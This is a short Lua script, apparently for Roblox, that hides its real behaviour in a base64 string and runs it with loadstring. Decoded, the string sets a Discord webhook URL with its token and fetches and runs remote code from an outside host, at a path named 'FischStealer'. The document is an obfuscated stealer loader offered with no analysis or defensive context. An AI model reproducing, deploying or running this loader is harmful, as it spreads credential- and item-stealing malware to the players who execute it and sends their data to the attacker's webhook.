
-- Obfuscated script
local encodedScript = "VXNlcm5hbWUgPSAiSGFoYWhhIgogICAgICBXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNDE1NDU5OTQ3Mzg4NjQxODAvRm1pXy1tRGJZSDNmZDZJWHp4V0xWWWJ0MXZwLWJUSUtNeG4waXd3UGFVUHE4d0wwR052V18yQ29TUnNRbjNEeGg3RE0iCgogICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cDovL2Vrc292YS54eXovRmlzY2hTdGVhbGVyIiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
